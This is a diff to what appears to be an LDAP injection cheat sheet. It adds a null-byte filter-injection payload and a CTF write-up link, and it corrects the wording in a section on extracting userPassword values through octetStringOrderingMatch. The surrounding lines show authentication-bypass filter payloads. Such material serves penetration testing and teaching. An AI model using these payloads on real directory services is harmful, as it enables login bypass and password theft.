@@ -26,6 +26,7 @@ query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
 *
 *)(&
 *))%00
+)(cn=))\x00
 *()|%26'
 *()|&'
 *(|(mail=*))
@@ -84,7 +85,7 @@ commonName
 
 ## Exploiting userPassword attribute
 
-userPassword’ attribute in not a string like the ‘cn’ attribute for example but it’s an OCTET STRING
+`userPassword` attribute is not a string like the `cn` attribute for example but it’s an OCTET STRING
 In LDAP, every object, type, operator etc. is referenced by an OID : octetStringOrderingMatch (OID 2.5.13.18).
 
 > octetStringOrderingMatch (OID 2.5.13.18): An ordering matching rule that will perform a bit-by-bit comparison (in big endian ordering) of two octet string values until a difference is found. The first case in which a zero bit is found in one value but a one bit is found in another will cause the value with the zero bit to be considered less than the value with the one bit.
@@ -100,3 +101,4 @@ userPassword:2.5.13.18:=\xx\xx\xx
 * [OWASP LDAP Injection](https://www.owasp.org/index.php/LDAP_injection)
 * [LDAP Blind Explorer](http://code.google.com/p/ldap-blind-explorer/)
 * [ECW 2018 : Write Up - AdmYSsion (WEB - 50) - 0xUKN](https://0xukn.fr/posts/WriteUpECW2018AdmYSsion/)
+* [Quals ECW 2018 - Maki](https://maki.bzh/courses/blog/writeups/qualecw2018/)
